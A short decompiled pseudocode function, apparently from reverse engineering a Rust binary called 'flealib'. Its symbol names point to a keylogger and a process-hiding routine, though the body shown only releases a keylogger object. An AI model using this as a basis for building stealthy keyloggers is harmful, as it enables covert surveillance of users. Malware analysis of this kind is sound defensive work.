__int64 __fastcall flealib::hideflea::hide_flea_process(__int64 a1)
{
  __int64 v2; // [rsp+0h] [rbp-8h] BYREF

  v2 = a1;
  core::ptr::drop_in_place<alloc::sync::Arc<std::sync::mutex::Mutex<flealib::keylogger::Keylogger>>>(&v2);
  return v2;
}